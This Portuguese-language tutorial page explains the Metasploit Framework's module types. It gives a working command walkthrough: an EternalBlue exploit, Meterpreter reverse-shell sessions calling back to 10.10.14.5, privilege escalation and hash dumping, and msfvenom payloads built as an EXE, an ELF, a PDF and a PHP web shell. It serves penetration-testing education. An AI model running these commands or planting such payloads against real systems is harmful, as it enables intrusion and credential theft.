Metasploit Framework

O que é Metasploit?

Metasploit Framework

Framework open source que unifica exploits, payloads e ferramentas de pós-exploração.

Metasploit Framework é o framework de exploração mais usado no mundo — open source, mantido pela Rapid7. Centraliza exploits, payloads, encoders e ferramentas de pós-exploração em um ambiente unificado. Transforma exploração em processo estruturado e reproduzível.

msfconsole é a interface principal do Metasploit — CLI interativa. Versão Metasploit Pro (paga) adiciona GUI, automação e relatórios. Para pentests profissionais, a versão open source (Framework) é suficiente.

Arquitetura e Módulos

Exploits

Código que usa uma vulnerabilidade específica para executar o payload no sistema alvo. Ex: exploit/windows/smb/ms17_010_eternalblue

Payloads

O código executado após o exploit ter sucesso. Singles (independentes), Stagers (baixam um stage), Stages. Ex: windows/x64/meterpreter/reverse_tcp

Auxiliary

Módulos sem payload — scanners, fuzzers, enumeração, brute force, sniffers. Ex: auxiliary/scanner/smb/smb_ms17_010

Post

Pós-exploração — executados após comprometer um sistema. Coleta de hashes, keylogging, screen capture, hashdump. Ex: post/multi/recon/local_exploit_suggester

Encoders

Ofuscam o payload para evitar assinatura de antivírus. Ex: encoder/x86/shikata_ga_nai. Note: encoders básicos não enganam EDRs modernos.

Meterpreter

O payload mais poderoso do Metasploit — shell avançado que roda inteiramente em memória, criptografado. Comandos especiais: upload/download, migrate, getsystem, hashdump, screenshare.

Uso Básico — Workflow

# Iniciar msfconsole:
msfconsole

# Buscar exploit:
search eternalblue
search type:exploit platform:windows smb

# Usar módulo:
use exploit/windows/smb/ms17_010_eternalblue

# Ver opções necessárias:
show options

# Configurar:
set RHOSTS 10.10.10.10
set LHOST 10.10.14.5     # seu IP
set LPORT 4444

# Escolher payload:
set payload windows/x64/meterpreter/reverse_tcp

# Executar:
run    # ou: exploit

# Uma vez no Meterpreter:
sysinfo             # informações do sistema
getuid              # usuário atual
getsystem           # tentar virar SYSTEM
hashdump            # dump de hashes (requer SYSTEM)
upload exploit.exe  # upload de arquivo
download data.txt   # download de arquivo
shell               # shell CMD normal
background          # voltar para msfconsole

MSFVenom — Geração de Payloads

# Payload Windows — EXE com reverse shell:
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe

# Payload Linux — ELF:
msfvenom -p linux/x64/meterpreter/reverse_tcp \
    LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf

# Injetar em PDF:
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=10.10.14.5 LPORT=4444 -f pdf -o malicioso.pdf

# Web shell PHP:
msfvenom -p php/meterpreter/reverse_tcp \
    LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php

# Listener para receber a conexão:
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set LPORT 4444
run

Metasploit acelera drasticamente o trabalho de exploração e pós-exploração. Mas saber o que está acontecendo por baixo — o protocolo, a vulnerabilidade — é tão importante quanto saber usar a ferramenta. Para pentest web, combine com Burp Suite.

"Metasploit não é muleta — é amplificador. Você precisa entender a vulnerabilidade antes de usar o módulo."
